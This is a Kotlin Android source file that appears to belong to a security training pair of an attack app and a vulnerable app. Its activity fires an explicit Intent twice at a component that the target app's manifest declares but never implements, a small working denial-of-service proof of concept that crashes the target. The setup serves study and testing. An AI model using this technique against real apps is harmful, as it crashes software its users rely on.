package com.forgo7ten.attackapp.attack.unimplcomp

import android.content.Intent
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import com.forgo7ten.attackapp.R
import com.forgo7ten.attackapp.attack.denialservice.Some
import com.forgo7ten.attackapp.databinding.ActivityUnimplCompBinding

/**
 * @ClassName UnimplCompActivity
 * @Description // Manifest中定义组件未实现 攻击测试
 * @Author Forgo7ten
 **/
class UnimplCompActivity : AppCompatActivity() {
    private lateinit var binding: ActivityUnimplCompBinding
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityUnimplCompBinding.inflate(layoutInflater)
        setContentView(binding.root)
        binding.btnAttack.setOnClickListener {
            val sendIntent = Intent().apply {
                // 采用直接指定包名和类名的方式启动组件
                setClassName("com.forgo7ten.vulnerableapp", "com.forgo7ten.vulnerableapp.vulnerabilities.NonexistentActivity")
            }
            // 重复发送两次，触发“屡次停止运行”
            repeat(2) { startActivity(sendIntent) }
        }
    }
}